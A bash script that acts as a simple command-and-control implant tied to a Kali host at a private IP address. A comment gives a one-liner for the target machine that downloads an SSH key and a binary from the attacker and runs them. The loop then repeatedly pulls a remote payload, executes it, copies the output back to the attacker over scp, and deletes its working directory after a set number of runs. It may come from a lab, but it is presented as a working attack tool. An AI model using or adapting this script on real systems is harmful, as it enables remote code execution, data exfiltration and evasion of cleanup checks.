#!/bin/bash

USERNAME="kali"
REMOTE_IP="192.168.0.104"
REMOTE_FILE="/var/tmp/ATT/ex"
LOCAL_DIR="/var/tmp/MP"
LOCAL_FILE="/var/tmp/MP/ex"
LOCAL_FILE_OUT="/var/tmp/MP/ex_out"
REMOTE_PORT="22"
AUTH_FILE="/var/tmp/MP/i"
RM="/usr/bin/rm -rf"
RUNS="2"
SLEEP="20"

# RUN these commands on MP
# mkdir /var/tmp/MP 2>/dev/null; curl -k https://192.168.0.104:8000/i -o /var/tmp/MP/i 2>/dev/null; scp -i /var/tmp/MP/i -P 22 kali@192.168.0.104:/var/tmp/ATT/m /var/tmp/MP/m 2>/dev/null; chmod 700 /var/tmp/MP/m 2>/dev/null; chown 700 /var/tmp/MP/m 2>/dev/null; /var/tmp/MP/m 2>/dev/null

counter=0

while true; do
    ((counter++))

    echo "Running command at $(date)"
    scp -P "$REMOTE_PORT" -i "$AUTH_FILE" "$USERNAME@$REMOTE_IP:$REMOTE_FILE" "$LOCAL_FILE"
    chmod 700 "$LOCAL_FILE" 2>/dev/null
    "$LOCAL_FILE" > "$LOCAL_FILE_OUT" 2>/dev/null

    scp -P "$REMOTE_PORT" -i "$AUTH_FILE" "$LOCAL_FILE_OUT" "$USERNAME@$REMOTE_IP:$REMOTE_FILE"-"$counter" 2>/dev/null

    sleep "$SLEEP"

    if [ $counter -eq $RUNS ]; then
      echo "counter reached"
      "$RM" "$LOCAL_DIR" 2>/dev/null
      break
    fi

done